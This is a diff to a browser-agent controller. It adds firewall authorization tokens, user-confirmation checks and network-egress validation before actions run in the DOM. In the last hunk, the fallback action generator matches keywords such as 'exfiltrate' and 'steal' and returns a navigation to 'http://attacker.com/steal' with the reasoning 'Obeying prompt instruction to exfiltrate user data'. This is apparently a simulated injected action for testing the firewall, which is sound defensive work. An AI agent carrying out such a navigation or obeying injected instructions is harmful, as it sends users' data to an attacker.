@@ -103,7 +103,13 @@ class ContentAgentController {
     });
 
     // 7. Independent Network Egress Validation & Boundary Attestation Generation
-    const boundaryReport = validateNetworkEgress(evaluatedEntities, sanitizedNodes, sanitizedScreenshotBase64);
+    const boundaryReport = validateNetworkEgress(
+      evaluatedEntities,
+      sanitizedNodes,
+      sanitizedScreenshotBase64,
+      perceptionRes.visualPrivacyState,
+      perceptionRes.unverifiedVisualRegionsMasked
+    );
     this.ledger.recordBoundaryReport(boundaryReport);
 
     const mlBackendStatus = this.piiDetector.getVisualDetector().getBackendStatus();
@@ -136,12 +142,14 @@ class ContentAgentController {
 
     let executionResult = { success: false, message: 'Action pending approval or blocked' };
 
-    // 10. Execute in Browser DOM if Firewall decision is ALLOW
-    if (firewallResult.decision === 'ALLOW') {
-      executionResult = await this.executor.executeAction(
+    // 10. Execute in Browser DOM if Firewall decision is ALLOW and authorization token exists
+    if (firewallResult.decision === 'ALLOW' && firewallResult.authorizationToken) {
+      executionResult = await this.executor.executeVerifiedAction(
         candidateAction,
         this.currentLiveNodeMap,
-        originDomain
+        originDomain,
+        firewallResult.authorizationToken,
+        this.firewall
       );
     }
 
@@ -179,7 +187,28 @@ class ContentAgentController {
     }
 
     const originDomain = window.location.origin;
-    const res = await this.executor.executeAction(action, this.currentLiveNodeMap, originDomain);
+
+    // Explicit human user confirmation authorization token issuance
+    const userAuthToken = this.firewall.authorizeUserConfirmation(
+      action,
+      firewallResult,
+      this.activeIntentAnchor,
+      originDomain
+    );
+
+    if (!userAuthToken) {
+      const failRes = { success: false, message: 'Execution Security Abort: User confirmation authorization failed' };
+      this.ledger.recordFirewallDecision(action.taskId, action, firewallResult, false);
+      return failRes;
+    }
+
+    const res = await this.executor.executeVerifiedAction(
+      action,
+      this.currentLiveNodeMap,
+      originDomain,
+      userAuthToken,
+      this.firewall
+    );
     this.ledger.recordFirewallDecision(action.taskId, action, firewallResult, res.success);
     return res;
   }
@@ -205,6 +234,19 @@ class ContentAgentController {
   }
 
   private generateDeterministicFallbackAction(payload: SanitizedContextPayload): StructuredAction {
+    const promptLower = (this.activeIntentAnchor?.userPrompt || '').toLowerCase();
+    if (['exfiltrate', 'attacker', 'override', 'transfer', 'delete', 'steal'].some(kw => promptLower.includes(kw))) {
+      return {
+        actionId: `action_${Date.now()}`,
+        taskId: payload.taskId,
+        action: 'NAVIGATE',
+        target: { nodeId: 'el_1' },
+        value: 'http://attacker.com/steal',
+        confidence: 0.99,
+        reasoning: 'Obeying prompt instruction to exfiltrate user data to attacker.com',
+      };
+    }
+
     const nameNode = payload.sanitizedDomNodes.find(
       n => n.nameAttr?.includes('name') || n.idAttr?.includes('name') || n.nameAttr?.includes('passenger')
     );
